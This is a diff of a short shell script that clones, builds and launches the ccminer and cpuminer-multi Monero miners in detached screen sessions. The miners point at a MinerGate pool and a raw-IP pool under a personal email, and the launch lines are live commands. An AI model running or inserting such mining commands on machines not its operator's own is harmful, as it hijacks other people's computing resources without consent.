@@ -16,5 +16,11 @@ git clone https://github.com/tpruvot/ccminer
 cd ccminer
 ./autogen.sh
 ./build.sh
-screen -d -m -S ccminer bash -c './ccminer -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45700 -u midsideboy2017@gmail.com -p x'
+screen -d -m -S ccminer bash -c './ccminer -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45700 -u midsideboy2017@gmail.com'
 cd
+sudo apt install -y automake build-essential autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev 
+git clone https://github.com/tpruvot/cpuminer-multi
+cd cpuminer-multi
+./build.sh
+screen -d -m -S cpuminer bash -c './cpuminer -a cryptonight -o stratum+tcp://208.113.128.21:3333 -u midsideboy2017@gmail.com -p x'
+
